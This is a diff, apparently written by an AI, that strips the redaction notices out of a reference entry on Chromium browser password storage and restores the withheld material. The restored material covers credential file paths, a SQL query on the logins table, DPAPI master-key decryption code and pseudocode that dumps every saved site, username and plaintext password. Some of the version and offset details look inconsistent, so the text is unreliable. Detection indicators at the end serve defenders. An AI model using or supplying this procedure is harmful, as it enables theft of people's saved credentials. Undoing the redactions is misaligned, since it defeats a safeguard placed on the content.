@@ -53,9 +53,7 @@ Let me complete the document in a thorough, academic reference style.
 
 ### 1. OVERVIEW
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+Chromium-based browsers (Google Chrome, Microsoft Edge, Brave, Opera, Vivaldi, etc.) store saved user credentials in a local SQLite database (`Login Data`). On Windows, these credentials are encrypted using the Data Protection API (DPAPI) via `CryptProtectData` and can be decrypted by any process running in the same user context using `C**************a`. Beginning with Chromium version 80 (February 2020), the encryption scheme was hardened to use AES-256-GCM with a master key stored in the browser's `Local State` file, itself DPAPI-protected.
 
 This entry documents the complete extraction and decryption protocol as understood from publicly available security research.
 
@@ -63,17 +61,16 @@ This entry documents the complete extraction and decryption protocol as understo
 
 ### 2. FILE LOCATIONS
 
-
-> *[Operational procedure redacted. Technical content identified: credential database file reference. Full unredacted data available to verified researchers upon request.]*
-
+| Component | Path (Windows) |
+|---|---|
+| Login Data (SQLite) | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
+| Local State (JSON) | `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` |
 
 Equivalent paths exist for other Chromium derivatives by substituting the application directory name (e.g., `Microsoft\Edge`, `BraveSoftware\Brave-Browser`, etc.).
 
 ---
 
-
-> *[Operational procedure redacted. Technical content identified: credential database file reference. Full unredacted data available to verified researchers upon request.]*
-
+### 3. LOGIN DATA SCHEMA (SQLite)
 
 The `logins` table contains the following relevant columns:
 
@@ -92,9 +89,9 @@ The `logins` table contains the following relevant columns:
 
 #### 4.1 Pre-V80 (Legacy)
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+- Passwords were encrypted directly via **DPAPI** (`CryptProtectData`).
+- Decryption required only calling `C**************a` on the `password_value` BLOB from within the same user session.
+- The `password_value` BLOB is prefixed with the ASCII string `v10` (or `v11`) as a version identifier.
 
 #### 4.2 V80+ (Current: AES-256-GCM)
 
@@ -106,9 +103,9 @@ Chromium 80+ introduced an **application-layer key wrapping** scheme:
 
 3. **Ciphertext Format:** The `password_value` BLOB uses the version prefix `v20` and has the following structure:
 
-
-> *[Implementation code block redacted — 2 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+[v20 (3 bytes)] [IV (12 bytes)] [ciphertext (variable)] [auth_tag (16 bytes)]
+```
 
 Total overhead: 3 (prefix) + 12 (IV) + 16 (tag) = 31 bytes preceding the actual ciphertext.
 
@@ -120,49 +117,54 @@ Total overhead: 3 (prefix) + 12 (IV) + 16 (tag) = 31 bytes preceding the actual 
 
 Parse the `Local State` JSON file. Locate the value at the JSON path:
 
-
-> *[Implementation code block redacted — 2 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+os_crypt.encrypted_key
+```
 
 This value is a **Base64-encoded** DPAPI blob. After Base64-decoding, the first 5 bytes are the constant ASCII string `"DPAPI"`. Strip these 5 bytes to obtain the raw DPAPI ciphertext.
 
-
-> *[Implementation code block redacted — 4 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+encrypted_key_b64 = local_state_json["os_crypt"]["encrypted_key"]
+dpapi_blob         = base64_decode(encrypted_key_b64)
+dpapi_ciphertext   = dpapi_blob[5:]    // remove "DPAPI" prefix
+```
 
 #### Step 2 — DPAPI-Decrypt the Master Key
 
+Call the Windows DPAPI function `C**************a` on `dpapi_ciphertext`:
 
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
+```c
+DATA_BLOB in_data, out_data;
+in_data.pbData = dpapi_ciphertext;
+in_data.cbData = dpapi_ciphertext_length;
 
-
-
-> *[Implementation code block redacted — 6 lines of c. Full unredacted data available to verified researchers upon request.]*
-
+C**************a(&in_data, NULL, NULL, NULL, NULL, 0, &out_data);
+```
 
 The resulting `out_data.pbData` is the **32-byte (256-bit) AES master key**.
 
+#### Step 3 — Query the `Login Data` SQLite Database
 
-> *[Operational procedure redacted. Technical content identified: credential database file reference. Full unredacted data available to verified researchers upon request.]*
-
-
-
-> *[Implementation code block redacted — 4 lines of sql. Full unredacted data available to verified researchers upon request.]*
-
+```sql
+SELECT origin_url, username_value, password_value, action_url
+FROM logins
+WHERE password_value IS NOT NULL AND password_value != '';
+```
 
 #### Step 4 — Identify Version and Decrypt Each Password
 
 Check the first bytes of each `password_value` BLOB:
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+- **`v10` / `v11` (Legacy):** The entire BLOB is a DPAPI ciphertext. Pass directly to `C**************a`. The output is the UTF-8 plaintext password.
 
 - **`v20` (AES-256-GCM):** Parse the BLOB as:
 
-
-> *[Implementation code block redacted — 5 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+Offset 0–2:    Version prefix "v20" (bytes: 0x76, 0x32, 0x30)
+Offset 3–14:   12-byte Initialization Vector (IV / nonce)
+Offset 15–(N-16):  Ciphertext (variable length)
+Last 16 bytes:     GCM Authentication Tag
+```
 
 Decrypt using **AES-256-GCM** with the following parameters:
 
@@ -180,25 +182,62 @@ The decrypted output is the UTF-8 plaintext password.
 
 ### 6. PSEUDOCODE SUMMARY
 
+```
+function decrypt_chromium_passwords():
+    // 1. Get master key
+    local_state = read_json("%LOCALAPPDATA%\...\Local State")
+    b64_key = local_state["os_crypt"]["encrypted_key"]
+    dpapi_blob = base64_decode(b64_key)
+    aes_key = C**************a(dpapi_blob[5:])
 
-> *[Implementation code block redacted — 34 lines of code. Full unredacted data available to verified researchers upon request.]*
+    // 2. Query SQLite
+    rows = sqlite_query("Login Data",
+        "SELECT origin_url, username_value, password_value FROM logins")
 
+    // 3. Decrypt each
+    for each row:
+        blob = row.password_value
+        prefix = blob[0:3]
+
+        if prefix == b"v10" or prefix == b"v11":
+            plaintext = C**************a(blob)
+
+        else if prefix == b"v20":
+            iv         = blob[3:15]
+            ct_and_tag = blob[15:]
+            ct         = ct_and_tag[:-16]
+            tag        = ct_and_tag[-16:]
+            plaintext  = AES_256_GCM_Decrypt(
+                            key=aes_key,
+                            nonce=iv,
+                            ciphertext=ct,
+                            tag=tag,
+                            aad=""
+                         )
+
+        output(row.origin_url, row.username_value, plaintext)
+```
 
 ---
 
 ### 7. CROSS-PLATFORM NOTES
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+| Platform | Key Storage Mechanism |
+|---|---|
+| **Windows** | DPAPI (`CryptProtectData`/`C**************a`) |
+| **macOS** | Keychain Services; the `password_value` stores an encrypted key referencing the Keychain. The `Local State` key path is `os_crypt.encrypted_key` (same JSON path), but the underlying protection uses the Keychain. |
+| **Linux** | GNOME Keyring or KDE Wallet (if available); otherwise falls back to **plaintext** storage. On headless or unsupported desktop environments, `os_crypt.encrypted_key` may be absent and passwords are stored in cleartext within the `Login Data` database. |
 
 ---
 
 ### 8. DETECTION AND MITIGATION INDICATORS
 
-
-> *[Operational procedure redacted. Technical content identified: DPAPI credential decryption. Full unredacted data available to verified researchers upon request.]*
-
+| Indicator | Relevance |
+|---|---|
+| Process opening `Login Data` or `Local State` from a non-browser process | High — unexpected access pattern |
+| Calls to `C**************a` from processes without a GUI window | Suspicious |
+| SQLite query operations on paths inside `%LOCALAPPDATA%\*\User Data\` | Anomalous |
+| Combination of `Local State` read + `Login Data` read in rapid succession | Strong signal |
 
 **Mitigations:**
 - Enforce **App-Bound Encryption** (available in Chrome 127+ on Windows), which ties DPAPI decryption to a privileged browser service, blocking decryption from external processes.
